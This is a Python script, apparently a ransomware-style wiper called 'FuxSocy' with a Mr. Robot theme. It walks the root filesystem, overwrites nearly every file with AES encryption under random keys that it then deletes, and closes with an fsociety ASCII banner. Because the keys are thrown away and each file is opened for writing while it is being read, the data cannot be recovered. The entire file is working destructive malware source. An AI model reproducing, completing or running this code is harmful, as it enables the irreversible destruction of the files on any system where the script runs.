#!/usr/bin/python3
import os
import subprocess
import sys
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Hash import SHA256
from random import SystemRandom


def encrypt(filepath, key):
    initialization_vector = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, initialization_vector)
    with open(filepath, 'rb') as infile:
        with open(filepath, 'wb') as outfile:
            while True:
                chunk = infile.read(65536)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))

def load_entropy():
    print("Loading Source of Entropy")
    source = os.urandom(256)
    for i in range(3):
      source += os.urandom(2 ** (21 + i))
      update_progress(((i + 1.0) / 3.0))
    print("\n")
    return source

def update_progress(progress):
    bar_length = 23
    status = "({}%)".format(str(progress)[2:4])
    if progress >= 1.0:
        progress = 1
        status = "COMPLETE"
    block = int(round(bar_length * progress))
    text = "\r{0}\t\t{1}".format("#" * block + " " * (bar_length - block), status)
    sys.stdout.write(text)
    sys.stdout.flush()

def generate_keys(source):
    print("Generating Keys")
    keys = []
    for i in range(9):
        keys.append(SHA256.new(bytes([SystemRandom().choice(source) for _ in range(SystemRandom().randint(128, 256)) for _ in range(SystemRandom().randint(128, 256))])).digest())
        if i % 3 == 0:
            update_progress(((i + 1.0) / 3.0))
    print("\n")
    return keys

def locate_files():
    print("Locating target files.")
    targets = next(os.walk('/'))[1]
    for core in ('proc', 'sys', 'lib', 'run'):
        targets.remove(core)
    return targets

def encrypt_dir(directory, key):
    root = next(os.walk(directory))[0]
    directories = next(os.walk(directory))[1]
    files = next(os.walk(directory))[2]

    if len(files) > 0:
        for file in files:
            path = root + '/' + file
            try:
                if '/dev' in path[:4]:
                    if not any(substring in path for substring in ('sg', 'fd', 'char', 'by-u', 'pts', 'cpu', 'mapper', 'input', 'bus', 'disk')):
                        if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq', 'timer', '-', ':', 'disk', 'block', 'char')):
                                                        encrypt(path, key)
                else:
                    encrypt(path, key)
            except:
                pass

    if len(directories) > 0:
        for directory in directories:
            path = root + '/' + directory
            encrypt_dir(path, key)

def pwn():
    keys = generate_keys(load_entropy())
    dirs = locate_files()
    print("beginning crypto operations")
    for dir in sorted(dirs):
        directory = '/%s' % dir
        print("Encrypting {}".format(directory))
        encrypt_dir(directory, key=SystemRandom().choice(keys))
    keys = None
    del keys
    print("""      
      __                _      _         
     / _|              (_)    | |        
    | |_ ___  ___   ___ _  ___| |_ _   _ 
    |  _/ __|/ _ \ / __| |/ _ \ __| | | |
    | | \__ \ (_) | (__| |  __/ |_| |_| |
    |_| |___/\___/ \___|_|\___|\__|\__, |
                                    __/ |
                                   |___/ 

cddddddddddddddddddddddddddddddddddddddddddd;
0Mo..........':ldkO0KKXXKK0kxoc,..........kMd
0Ml......;d0WMMMMMMMMMMMMMMMMMMMMMMMWKx:......kMd
0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd
0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd
0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd
0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd
0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd
0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd
0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd
0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd
0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd
0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd
0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd
0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd
0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd
0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd
0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd
0MMO.....................................WMMd
0Mdkc...................................0kOMd
0Ml.:Ol;........';;.......;,........':oX:.kMd
0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd
0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd
0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd
0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd
0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd
0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMMMMMNl......kMd
0Ml........lXMMMMMMMMMMMMMMMMMMMMMMMKc........kMd
0Ml..........:KMMMMMMMMMMMMMMMMMMM0,..........kMd
oO:............xOOOx:'';dOOOOd............lOc\n\n""")
    exit(0)

if __name__ == '__main__':
    subprocess.call('clear')
    print("Executing FuxSocy")
    pwn()
